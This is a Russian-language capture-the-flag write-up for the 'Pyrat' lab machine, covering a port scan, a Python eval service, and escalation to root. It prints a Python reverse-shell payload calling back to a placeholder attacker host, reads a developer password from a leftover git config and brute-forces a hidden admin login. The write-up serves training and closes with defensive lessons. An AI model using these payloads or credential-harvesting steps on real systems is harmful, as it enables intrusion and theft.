# Pyrat

**Сложность:** Easy
**Техники:** RCE через Python-сокет (eval) · утечка учёток в git · брут логина → root

## Разведка
```bash
nmap -sC -sV -p- -oN portscan.nmap <ip>
```
```
22/tcp   open  ssh      OpenSSH 8.2p1
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```
Порт 8000 ведёт себя странно — на текст отвечает ошибками Python (`name 'GET' is not defined`), то есть **ввод исполняется как Python** (`eval`).

## Закрепление — RCE через Python eval
Листенер:
```bash
nc -lvnp 4444
```
Payload на порт 8000 (reverse shell):
```python
import socket,subprocess,os;s=socket.socket();s.connect(("<attacker>",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty;pty.spawn("/bin/bash")
```
Шелл под `www-data`.

## Энумерация — утечка учёток в git
```bash
cd /opt/dev/.git && cat config
# [credential "https://github.com"]
#     username = think
#     password = _TH1NKIN****ate$_
```
Оставленный на диске каталог `.git` слил учётку разработчика.

## Боковое перемещение
```bash
ssh think@<ip>      # пароль из git config
cat user.txt        # THM{REDACTED}
```

## Повышение привилегий — скрытая admin-команда
`git show` показал исходник сервиса: порт 8000 имеет скрытый admin-вход, после которого доступна команда `shell` от root. Логин/пароль подобраны мелкими скриптами:
```
[+] Input found: admin
[+] Password found: abc123
```
```bash
nc <ip> 8000
admin
Password: abc123
Welcome Admin!!! Type "shell" to begin
shell
# id  →  uid=0(root)
```
`root.txt` → `THM{REDACTED}`.

## Выводы
- Никогда не `eval()` сетевой ввод — это RCE по определению.
- Закоммиченный `.git` сливает историю и секреты; держать вне веб-корня.
- Чтение исходника (через слитый репозиторий) открыло путь привилегий — анализ кода это часть разведки.
